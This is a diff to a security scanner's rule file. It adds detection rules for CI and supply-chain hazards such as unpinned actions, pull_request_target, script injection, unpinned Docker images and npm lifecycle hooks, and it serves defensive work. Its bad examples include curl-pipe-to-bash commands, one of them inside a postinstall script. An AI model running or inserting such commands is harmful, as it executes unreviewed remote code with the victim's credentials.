@@ -905,6 +905,82 @@ false_positive_guidance = "Installing from a one-off formula URL is occasionally
 remediation = "Install formulae by name from a reviewed tap; if you must use a custom tap, confirm the tap repository is one you trust."
 mitre_id = "T1195.002"
 
+# ── CI / repo supply-chain scan rules ───────────────────────────────────
+# File-content rules surfaced by `tirith scan` over a repository's own CI /
+# infrastructure files. They detect dangerous patterns, never the tools.
+
+[[rule]]
+id = "workflow_unpinned_action"
+title = "GitHub Actions step pinned to a mutable ref"
+category = "ecosystem"
+severity_rationale = "Medium — an action pinned to a branch or tag can have its code changed under you between runs; if the action is compromised, malicious code runs in CI with repository credentials."
+description = "A GitHub Actions workflow `uses:` a third-party action pinned to a mutable ref — a branch (`@main`) or a tag (`@v3`) — rather than an immutable 40-character commit SHA. Tags and branches can be re-pointed by whoever controls the action repository."
+examples_bad = ["uses: actions/checkout@v4", "uses: actions/checkout@main"]
+examples_good = ["uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608"]
+false_positive_guidance = "Pinning to a tag is extremely common and is not itself malicious — it is a hardening gap. A workflow that deliberately tracks a mutable tag for a trusted first-party action can allowlist this rule."
+remediation = "Pin every third-party action to a full 40-character commit SHA; record the human-readable version in a trailing comment."
+mitre_id = "T1195.001"
+
+[[rule]]
+id = "workflow_dangerous_trigger"
+title = "Workflow uses the pull_request_target trigger"
+category = "ecosystem"
+severity_rationale = "High — pull_request_target runs with a read/write GITHUB_TOKEN and repository secrets in the context of an untrusted fork's pull request; combined with a checkout of PR code it is a known secret-exfiltration vector."
+description = "A GitHub Actions workflow is triggered by `pull_request_target`. Unlike `pull_request`, this trigger grants the workflow repository secrets and a privileged token even for pull requests from forks."
+examples_bad = ["on:\n  pull_request_target:"]
+examples_good = ["on:\n  pull_request:"]
+false_positive_guidance = "pull_request_target is legitimate for workflows that label or comment on PRs without running PR code. It is dangerous only when the workflow checks out and executes the PR head — review the workflow body."
+remediation = "Use `pull_request` instead; if `pull_request_target` is required, never check out or execute untrusted PR code and minimize the token's permissions."
+mitre_id = "T1195.001"
+
+[[rule]]
+id = "workflow_curl_pipe_shell"
+title = "Workflow run step pipes a download into a shell"
+category = "ecosystem"
+severity_rationale = "High — a script fetched and piped straight into a shell inside CI is never reviewed or pinned and executes with the workflow's credentials."
+description = "A workflow `run:` step fetches a script over the network (curl/wget) and pipes it directly into a shell interpreter. The fetched code is whatever the server returns at run time."
+examples_bad = ["run: curl https://example.com/install.sh | bash"]
+examples_good = ["run: curl -fsSL -o install.sh https://example.com/install.sh && sha256sum -c install.sh.sha256 && bash install.sh"]
+false_positive_guidance = "Some vendor install docs use this pattern. Inside CI it is still a hardening gap — download, verify, then run."
+remediation = "Download the script to a file, verify it against a checksum or signature, and only then execute it."
+mitre_id = "T1195.002"
+
+[[rule]]
+id = "workflow_untrusted_input"
+title = "Untrusted input interpolated into a workflow run step"
+category = "ecosystem"
+severity_rationale = "High — an attacker-controllable `${{ github.event.* }}` value interpolated into a shell run step is the classic GitHub Actions script-injection sink; a crafted PR title or issue body executes as a shell command."
+description = "A workflow `run:` step interpolates a `${{ github.event.* }}` (or `github.head_ref`) expression — a PR title, issue body, branch name, comment, … — directly into a shell command. Those values come from untrusted contributors."
+examples_bad = ["run: echo \"${{ github.event.issue.title }}\""]
+examples_good = ["env:\n  TITLE: ${{ github.event.issue.title }}\nrun: echo \"$TITLE\""]
+false_positive_guidance = "Interpolating a trusted context value (github.sha, github.repository) is safe. This rule flags only the known attacker-controllable contexts."
+remediation = "Pass the untrusted value through an intermediate `env:` variable and reference it as a quoted shell variable, never inline it into the script text."
+mitre_id = "T1195.001"
+
+[[rule]]
+id = "dockerfile_unpinned_image"
+title = "Dockerfile base image is not digest-pinned"
+category = "ecosystem"
+severity_rationale = "Medium — a base image on a mutable tag is re-resolved every build, so its contents and any vulnerabilities or tampering can change with no change to the Dockerfile."
+description = "A Dockerfile `FROM` instruction uses a base image on the mutable `latest` tag, or with no tag at all (Docker defaults to `latest`), and with no `@sha256:` digest pin."
+examples_bad = ["FROM ubuntu:latest", "FROM ubuntu"]
+examples_good = ["FROM ubuntu:22.04@sha256:abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"]
+false_positive_guidance = "Many Dockerfiles use a tag without a digest; this rule flags only the clearly-mutable `latest` and untagged cases, not specific version tags."
+remediation = "Pin the base image to an immutable digest: `FROM image:tag@sha256:<digest>`."
+mitre_id = "T1195.001"
+
+[[rule]]
+id = "package_script_dangerous"
+title = "Dangerous npm lifecycle script"
+category = "ecosystem"
+severity_rationale = "High — npm preinstall/install/postinstall hooks run automatically on `npm install`; a dangerous command in one is the standard malicious-npm-package delivery mechanism and executes before any package code is imported."
+description = "A `package.json` preinstall, install, or postinstall lifecycle script runs a dangerous command — a pipe-to-shell, a base64-decode-and-execute payload, an inline interpreter one-liner that shells out or opens a network connection, or a download-and-run sequence."
+examples_bad = ["{\"scripts\": {\"postinstall\": \"curl https://example.com/x.sh | bash\"}}"]
+examples_good = ["{\"scripts\": {\"postinstall\": \"node-gyp rebuild\"}}"]
+false_positive_guidance = "Many packages legitimately use postinstall for native builds (node-gyp). This rule fires only on remote-execution / obfuscation shapes, not on ordinary build steps."
+remediation = "Review the lifecycle script; if the package is a dependency, confirm the script is intentional or pin the dependency to a reviewed version."
+mitre_id = "T1195.002"
+
 # ── Rendered content rules ──────────────────────────────────────────────
 
 [[rule]]
